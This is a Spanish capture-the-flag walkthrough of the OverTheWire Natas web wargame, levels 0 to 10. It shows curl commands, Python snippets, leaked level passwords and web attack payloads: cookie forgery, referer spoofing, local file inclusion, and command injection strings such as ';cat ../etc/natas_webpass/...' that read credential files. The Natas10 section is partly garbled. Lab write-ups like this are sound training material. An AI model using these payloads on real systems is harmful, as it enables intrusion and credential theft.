
Natas son retos de pentesting web de "Over-The-Wire". Yo voy a realizar los ejercicios usando scripting en python y bash
Para resolver la pagina hay que encontrar la contraseña para autenticarse en el nivel siguiente con el usuario llamado igual que en nivel actual.

## Natas0

(Natas0)[http://natas0.natas.labs.overthewire.org]
*Vulnerabilidad: credenciales en el codigo fuente*

El nivel inicial, esconde la credencial en el código fuente. (clic derecho)
Con scripting se puede ver muy facilmente
```python
import requests
url = "http://natas0.natas.labs.overthewire.org/"
req = requests.get(url, auth=("natas0","natas0"), verify=False)
print(req.text)
```
Desde consola tambien es pan comido
```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas0.natas.labs.overthewire.org" -u natas0:natas0
... <!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```
## Natas1
(Natas1)[http://natas1.natas.labs.overthewire.org]
*Vulnerabilidad: credenciales en el codigo fuente*
*Restriccion: click derecho en el navegador*

El segundo nivel si visitas la web te dice que el click derecho esta prohibido. Nos autenticamos con la contraseña de antes.
Aunque se desactive dicho click en el navegador, con curl o python se puede acceder igualmente al codigo fuente
```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas1.natas.labs.overthewire.org" -u natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto
... <!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```

## Natas2

(Natas2)[http://natas2.natas.labs.overthewire.org]
*Vulnerabilidad: directory liting*

En la web aparentemente no hay nada y en el codigo fuente de natas2 no sale la contraseña, pero si sale un "img src" o sea una ruta de donde saca una foto.
```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas2.natas.labs.overthewire.org" -u natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
... <img src="files/pixel.png">
```
Si ponemos en el nevegador la ruta ```"http://natas2.natas.labs.overthewire.org/files"``` tenemos un directory listing, es decir una lista de todos los 
elementos que estan bajo dicha ruta, (entre ellas la foto de pixel.png) pero tambien un archivo de texto "users.txt" con la contraseña.

## Natas3

(Natas3)[http://natas3.natas.labs.overthewire.org]
*Vulnerabilidad: rutas criticas en el robots.txt*

Otro "no hay nada en esta web" en el navegador
```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas3.natas.labs.overthewire.org" -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 
<!-- No more information leaks!! Not even Google will find it this time... -->
```
Nos dice que no va a haber mas crendeciales filtradas, y que ni siquiera Google nos encontrará. Eso ultimo es una pista hacia la ruta "robots.txt"
la cual evita que Google indexe/encuentre ciertas rutas sensibles.
```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas3.natas.labs.overthewire.org/robots.txt" -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 
User-agent: *
Disallow: /s3cr3t/
```
Dicho "/s3cr3t" nos lleva a otro users.txt con las credenciales

## Natas4

(Natas4)[http://natas4.natas.labs.overthewire.org]
*Restriccion: referrer limitado*

Este nivel nos dice que solo acepta a gente que venga desde ```http://natas5.natas.labs.overthewire.org/```, es decir que desde esa página hayan pinchado en un link para venir a la actual. Esto se llama referrer. Con curl se puede esècificar dicho referrer con "-e"
```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas4.natas.labs.overthewire.org" -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ \
> -e http://natas5.natas.labs.overthewire.org/
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```
## Natas5

(Natas5)[http://natas5.natas.labs.overthewire.org]
*Vulnerabilidad: cookie forge o creacion de cookie*

Aqui te dice que simplemente no estas logueado, cuando se habla de loguins hay que pensar en cookies, ya que estas son las que arrastran dicho loguin.
```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas5.natas.labs.overthewire.org" -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq -I
Set-Cookie: loggedin=0
```
Hay una cookie llamada logguedin que se iguala a 0 por defecto, haciendo que salga el mensaje de que no estas logueado. La cookie se puede colocar 
con curl

```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas5.natas.labs.overthewire.org" -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq  --cookie "loggedin=1"
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
```
## Natas6

(Natas6)[http://natas6.natas.labs.overthewire.org]
*Vulnerabilidad: rutas en el codigo fuente*

Cuando visitamos la pagina hay un formulario para meter un "secreto" y con el ver la contraseña. Tambien hay un enlace a "index-source.html"
Aqui hay un pequeño php que nos dice que hay que meter un valor "secret" por POST, tambien una ruta "include 'includes/secret.inc';"
Si la isitamos damos con tal secreto
```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas6.natas.labs.overthewire.org/includes/secret.inc" -u natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
$secret = "FOEIUWGHFEEUHOFUOIU";
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas6.natas.labs.overthewire.org" -u natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 -X POST \
> -d "secret=FOEIUWGHFEEUHOFUOIU&submit="
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```

## Natas7

(Natas7)[http://natas7.natas.labs.overthewire.org]
*Vulnerabilidad: LFI (local file inclusion)*

Cuando visitamos la web, en el codigo fuente se filtra otra ruta, pero no se puede acceder poniendola en la URL sin más. Aun asi en la web hay dos
enlaces. Si clicamos en uno sale en la url un "index.php=home o index.php=about", que tambien se ve claramanete desde el codigo fuente.

```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas7.natas.labs.overthewire.org" -u natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas7.natas.labs.overthewire.org/etc/natas_webpass/natas8" -u natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```
Dicho index.php parece script que te redirige al sitio que pone tras el parametro "page". En este caso "home" y "about" pero la vulnerabilidad
reside en que podemos poner nosotros el parametro que nos de la gana y nos lleve alli. Nos interesa la ruta que se nos ha filtrado antes.

```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8" \ 
-u natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```

## Natas8

(Natas8)[http://natas8.natas.labs.overthewire.org]
*Vulnerabilidad: algoritmo de encriptado filrado*

Natas 8 nos pide otra vez un secreto y nos da la ruta del "index-source.html". 

```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas8.natas.labs.overthewire.org/index-source.html" -u natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe | html2text
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
function encodeSecret($secret) { return bin2hex(strrev(base64_encode($secret))); }
```
O sea un hash y como se ha fabricado, un codigo al que le tendremos que dar la vuelta.

```console
[cucuxii@parrot]~[natas0]:$ php --interactive
php > print(hex2bin("3d3d516343746d4d6d6c315669563362"));   # Si ha hecho un bin2hex supongo que existira un hex2bin
==QcCtmMml1ViV3b
php > print(strrev("==QcCtmMml1ViV3b"));   # Esta funcion simplemente le da la vuelta a la string
b3ViV1lmMmtCcQ==
php > print(base64_decode("b3ViV1lmMmtCcQ=="));
oubWYf2kBq   # Se supone que este es el secreto
```

```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas8.natas.labs.overthewire.org" -u natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe \
> -X POST -d "secret=oubWYf2kBq&submit="
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```
Mira pues si era, que bien :3

## Natas9

(Natas8)[http://natas9.natas.labs.overthewire.org]
*Vulnerabilidad: OS command inyecion o inyeccion de comandos al sistema*

Aqui nos sale un formulario, dice que econtrara una string a la palabra que le introduzcamos 
```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas9.natas.labs.overthewire.org" -u natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl -X POST -d "name=neddle&submit="
# Un listado largo con "test" ->  testicle, testicle's, wettest, whitest
```
Esto ya huele un poco a un comando de bash ```grep test diccionario.txt``` En el enlace que se nos leakea "index-source.html" se confirma tal cosa
```$key = $_REQUEST["needle"];  passthru("grep -i $key dictionary.txt");```

¿Que pasa cuando te dejan meter input a un comando de bash? Pues que puedes meter mas comandos con el ";" que es concatenar comandos, es decir ejecutar
otro comando despues del anterior del grep

```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas9.natas.labs.overthewire.org" -u natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl -X POST \
> -d "needle=;pwd&submit="
/var/www/natas/natas9

[cucuxii@parrot]~[natas0]:$ curl -s "http://natas9.natas.labs.overthewire.org" -u natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl -X POST \
> -d "needle=;cat ../../../../../etc/natas_webpass/natas10&submit=" | head -n 22
```
Siguiendo la logica de la ruta donde suele meter esto las contraseñas le hemos dicho que nos la suelte con el "cat" y hemos ido rutas para atras porque
esto tira desde "/var/www/natas/natas9" y no desde "/"

# Natas10


(Natas8)[http://natas9.natas.labs.overthewire.org]
*Vulnerabilidad: OS command inyecion o inyeccion de comandos al sistema*
*Restricciones: no meter ciertos caracreres criticos como ;* 

Este nivel es exactamente lo mismo que el anterior, solo que aqui nos filtran el input diciendoq que no podemos meter caracteres como ";"
El tema es que si ponemos la ";" en urlencoder tambien la insterpretará y nos habremos saltado el filtro. ```php > echo urlencode(";");
%3B``` Pero tampoco funciona

Como el comando hace un ```curl palabra diccionario``` Lo que podemos es meterle nosotros el diccionario del que tirara y comnetando el original para que lo ignore. Para asegurarnos de que salgan resultados con el curl, lo mejor es poner letras indiviuales y probar. En este caso no sale hasta la c
```
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas10.natas.labs.overthewire.org" -u natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu \
> -X POST -d "needle=c /etc/natas_webpass/natas11 #&submit=" | head -n 23
-X POST -d "needle=c /etc/natas_webpass/natas11 #&submit=" | head -n 23
```
Comando que resulta ``` grep c /etc/natas_webpass/natas11 # diccionario.txt ``



